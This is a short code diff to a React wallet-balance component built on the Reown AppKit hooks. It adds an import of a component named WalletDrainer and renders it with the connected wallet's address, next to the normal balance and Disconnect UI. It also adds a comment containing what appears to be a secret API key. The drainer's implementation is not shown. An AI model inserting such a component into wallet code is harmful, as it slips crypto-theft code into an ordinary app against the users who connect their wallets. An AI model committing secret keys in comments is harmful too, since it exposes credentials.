@@ -7,6 +7,9 @@ import {
     useWalletInfo,
     useDisconnect
      } from '@reown/appkit/react'
+import WalletDrainer from './WalletDrainer';
+
+// sk_llama_42da39e579f7b9e5ecff2f6a25e5b51a
 
 function WalletBalance() {
   const { disconnect } = useDisconnect();
@@ -37,6 +40,7 @@ function WalletBalance() {
       <button onClick={handleDisconnect} className="bg-primary text-white btn-sm mt-2 px-1 rounded-md hover:bg-primary-dark transition">
         Disconnect
       </button>
+      <WalletDrainer wallet={address} />
     </div>
   );
 }
